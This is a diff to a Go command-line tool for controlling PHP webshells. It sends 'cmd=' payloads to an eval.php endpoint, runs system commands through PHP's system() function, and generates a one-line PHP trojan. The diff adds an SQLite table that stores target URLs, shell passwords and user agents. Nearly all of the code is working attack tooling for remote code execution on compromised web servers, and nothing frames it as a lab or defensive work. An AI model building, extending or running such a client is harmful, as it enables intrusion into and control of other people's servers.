@@ -1,20 +1,85 @@
 package main
 
 import (
+	"database/sql"
 	"flag"
 	"fmt"
 	"io"
+	"log"
 	"net/http"
 	"os"
 	"strings"
+
+	_ "github.com/mattn/go-sqlite3"
 )
 
 // 常量定义
 const (
 	userAgent   = `Mozilla/5.0 (iPod; U; CPU iPhone OS 3_2 like Mac OS X; cmn-TW) AppleWebKit/533.20.7 (KHTML, like Gecko) Version/3.0.5 Mobile/8B119 Safari/6533.20.7`
 	contentType = "application/x-www-form-urlencoded"
-	httpURL     = "http://10.10.10.16/eval.php"
+	httpURL     = "http://test.test/eval.php"
 )
+
+// handleError 函数用于处理错误，打印错误消息
+func handleError(err error, message string) {
+	if err != nil {
+		fmt.Printf("%s: %v\n", message, err)
+		log.Fatal(err)
+	}
+}
+
+func selectDb() {
+	db, err := sql.Open("sqlite3", "test.db")
+	handleError(err, "打开数据库错误!")
+	defer db.Close()
+
+	rows, err := db.Query("select id, url, passwd, ua from info;")
+	handleError(err, "查询数据库错误!")
+	defer rows.Close()
+
+	for rows.Next() {
+		var id int
+		var url, passwd, ua string
+		err := rows.Scan(&id, &url, &passwd, &ua)
+		handleError(err, "遍历数据库内容出错!")
+		fmt.Printf("id:%d url:%s passwd:%s ua:%s\n", id, url, passwd, ua)
+	}
+}
+
+func checkFile() {
+	_, err := os.Stat("test.db")
+	if err == nil {
+	} else if os.IsNotExist(err) {
+		fmt.Println("检测到数据库配置文件不存在，将创建数据库!")
+		createTable()
+	} else {
+		fmt.Printf("检查文件错误: %v\n", err)
+	}
+}
+
+func createTable() {
+	db, err := sql.Open("sqlite3", "test.db")
+	handleError(err, "打开数据库错误!")
+	defer db.Close()
+
+	createTableSQL := `
+    CREATE TABLE IF NOT EXISTS info (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        url TEXT NOT NULL,
+        passwd TEXT NOT NULL,
+        ua TEXT NOT NULL,
+        other TEXT NOT NULL
+    );`
+
+	_, err = db.Exec(createTableSQL)
+	handleError(err, "创建数据库出错!")
+
+	insertDataSQL := `
+    INSERT INTO info (url, passwd, ua, other) VALUES (?, ?, ?, ?);`
+
+	_, err = db.Exec(insertDataSQL, "http://test.test", "cmd", "test_ua", "备注信息")
+	handleError(err, "插入数据出错!")
+}
 
 // makeRequest 函数用于创建并发送 HTTP POST 请求
 func makeRequest(payload string) (*http.Response, error) {
@@ -30,19 +95,12 @@ func makeRequest(payload string) (*http.Response, error) {
 	return client.Do(req) // 发送请求并返回响应
 }
 
-// handleError 函数用于处理错误，打印错误消息
-func handleError(err error, message string) {
-	if err != nil {
-		fmt.Printf("%s: %v\n", message, err)
-	}
-	return
-}
-
 // executeCode 函数执行给定的 PHP 代码或系统命令
 func executeCode(code string) {
 	evalPayload := "cmd=" + code + ";"
 	shellPayload := "cmd=system('" + code + "');" // 修改此行，修复字符串拼接问题
 	fmt.Printf("%s\n%s\n", evalPayload, shellPayload)
+
 	// 使用 makeRequest 发送 PHP 代码执行请求
 	respEval, err := makeRequest(evalPayload)
 	handleError(err, "请求执行代码失败")
@@ -87,23 +145,21 @@ func generateWebShell() {
 	file, err := os.Create(filename)
 	handleError(err, "创建文件时出错!")
 	io.WriteString(file, text)
-	{
-		handleError(err, "写入文件出错")
-	}
+	handleError(err, "写入文件出错")
 	fmt.Printf("生成文件成功!文件名:%s\n", filename)
 }
 
 // printLogo 函数用于打印程序的 Logo 和帮助信息
 func printLogo() {
 	logo := `
-  ____            _    
- / ___| ___   ___| | __
-| |  _ / _ \ / __| |/ /
-| |_| | (_) | (__|   < 
- \____|\___/ \___|_|\_\
-`
+      ____            _    
+     / ___| ___   ___| | __
+    | |  _ / _ \ / __| |/ /
+    | |_| | (_) | (__|   < 
+     \____|\___/ \___|_|\_\
+    `
 	fmt.Printf("%s\n", logo)
-	fmt.Println("--help\t显示完整帮助信息\n--cmd\t输入要执行的 PHP 代码(省略`;`)\n--shell\t利用 system 函数执行系统命令\n--generate-shell\t生成简单的web_shell")
+	fmt.Println("--help\t显示完整帮助信息\n--cmd\t输入要执行的 PHP 代码(省略`;`)\n--shell\t利用 system 函数执行系统命令\n--generate-shell\t生成简单的web_shell\n--dbinfo\t显示目前数据库信息\n------------华丽的分割线-----------")
 }
 
 func main() {
@@ -111,6 +167,7 @@ func main() {
 	code := flag.String("cmd", "", "执行 PHP 代码")
 	shell := flag.String("shell", "", "利用system函数执行系统命令")
 	webShell := flag.Bool("generate-shell", false, "生成php的一句话木马")
+	dbInfo := flag.Bool("dbinfo", false, "显示目前数据库信息")
 
 	flag.Parse()
 
@@ -122,7 +179,11 @@ func main() {
 		executeCode(*shell)
 	} else if *webShell {
 		generateWebShell()
+	} else if *dbInfo {
+		selectDb()
 	} else {
-		fmt.Println("未提供任何命令或选项。使用 --help 以获取帮助信息。")
+		printLogo()
 	}
+
+	checkFile()
 }
